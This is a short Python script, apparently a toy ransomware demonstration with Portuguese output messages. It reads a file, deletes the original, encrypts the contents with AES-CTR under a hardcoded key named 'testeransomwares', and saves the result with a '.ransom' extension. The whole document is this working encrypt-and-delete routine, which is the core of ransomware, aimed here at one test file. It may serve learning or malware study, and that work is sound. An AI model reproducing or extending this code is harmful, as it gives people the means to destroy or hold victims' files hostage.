import os
import pyaes

def encrypt_file(file_name, key, output_file_name):
    try:
    
        with open(file_name, "rb") as file:
            file_data = file.read()

        os.remove(file_name)

        aes = pyaes.AESModeOfOperationCTR(key)

        crypto_data = aes.encrypt(file_data)

        with open(output_file_name, 'wb') as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo {file_name} criptografado para {output_file_name}.")

    except Exception as e:
        print(f"Erro durante a criptografia: {e}")

key = b"testeransomwares"
file_name = "teste.txt"
output_file_name = file_name + ".ransom"

encrypt_file(file_name, key, output_file_name)
